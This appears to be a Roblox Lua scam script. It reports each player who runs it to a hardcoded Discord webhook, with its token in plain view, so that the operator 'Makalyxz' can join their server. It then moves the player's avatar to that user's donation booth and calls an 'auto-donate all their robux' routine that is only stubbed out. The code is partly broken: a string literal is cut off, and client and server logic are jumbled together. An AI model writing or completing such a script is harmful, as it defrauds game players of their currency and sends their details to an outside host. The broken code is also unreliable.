local replicatedStorage = game:GetService("ReplicatedStorage")
local httpService = game:GetService("HttpService")
local runService = game:GetService("RunService")
local players = game:GetService("Players")
local workspace = game:GetService("Workspace")

local webhookUrl = "https://discord.com/api/webhooks/1271812329788407818/xKG5Ku8CMt6oWN-uSvQ1nvcMugVZsJVsAeDJn4efnVyWbgiMIBApJ_c1GUKDSuCc5_tn"
local targetUser = "Makalyxz"

-- create remote event
local moveToBoothEvent = Instance.new("RemoteEvent")
moveToBoothEvent.Name = "MoveToBoothEvent"
moveToBoothEvent.Parent = replicatedStorage

-- function to send webhook notification
local function sendWebhookNotification(executorName)
local joinScript = [[
local teleportService = game:GetService("TeleportService")
local players = game:GetService("Players")
local targetServer = nil

for _,v in pairs(players:GetPlayers()) do
if v.Name == "]] .. executorName .. [[" then
targetServer = v
break
end
end

if targetServer then
teleportService:TeleportToPlaceInstance(game.PlaceId, targetServer)
else
print("Player not found.")
end
]]

local data = {
content = executorName .. " has executed the script! Copy and run this script to join their server and auto-donate:
    "
}

local jsonData = httpService:JSONEncode(data)

httpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
end

-- server-side part handling execution and sending webhook
moveToBoothEvent.OnServerEvent:Connect(function(player)
sendWebhookNotification(player.Name)
end)

-- client-side part for detecting targetUser and firing moveToBoothEvent
local function findPlayerByName(name)
for _, player in pairs(players:GetPlayers()) do
if player.Name == name then
return player
end
end
return nil
end

runService.Heartbeat:Connect(function()
    local targetPlayer = findPlayerByName(targetUser)
if targetPlayer then
moveToBoothEvent:FireServer()
end
end)

-- server-side part for handling movement and donation
local function findBooth()
for _, part in pairs(workspace:GetDescendants()) do
if part.Name == "BoothPart" and part:IsA("BasePart") and part:FindFirstChild("PlayerName") and part.PlayerName.Value == targetUser then
return part
end
end
return nil
end

local function moveToBooth(player)
local boothPart = findBooth()
if boothPart then
local character = player.Character
if character then
local humanoid = character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid:MoveTo(boothPart.Position)
end
end
end
end

local function autoDonate(player)
-- simulate donation process. in reality, use the proper Roblox API for transactions
print(player.Name .. " is auto-donating all their robux!")
end

moveToBoothEvent.OnServerEvent:Connect(function(player)
moveToBooth(player)
autoDonate(player)
end)
